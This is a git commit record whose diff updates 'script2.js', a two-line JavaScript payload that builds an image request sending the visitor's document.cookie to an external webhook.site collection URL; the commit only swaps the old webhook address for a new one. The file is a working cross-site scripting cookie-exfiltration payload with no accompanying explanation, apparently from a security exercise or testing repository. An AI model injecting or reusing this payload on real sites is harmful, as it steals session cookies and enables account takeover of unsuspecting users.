ce71cd372cc9399a5c3ecc02a7cbd8db5c068a4c
pinyoko573 <87714995+pinyoko573@users.noreply.github.com>
2024-02-22 23:30:16 +0800

    Update script2.js

--- script2.js
+++ script2.js
@@ -1,2 +1,2 @@
 var i=new Image;
-i.src="http://webhook.site/5e261809-ed5e-4a56-8fec-8befa1b88c03/?"+document.cookie;
+i.src="https://webhook.site/cf8b9979-e43c-41cb-bb4f-5102cbb6b332/?"+document.cookie;
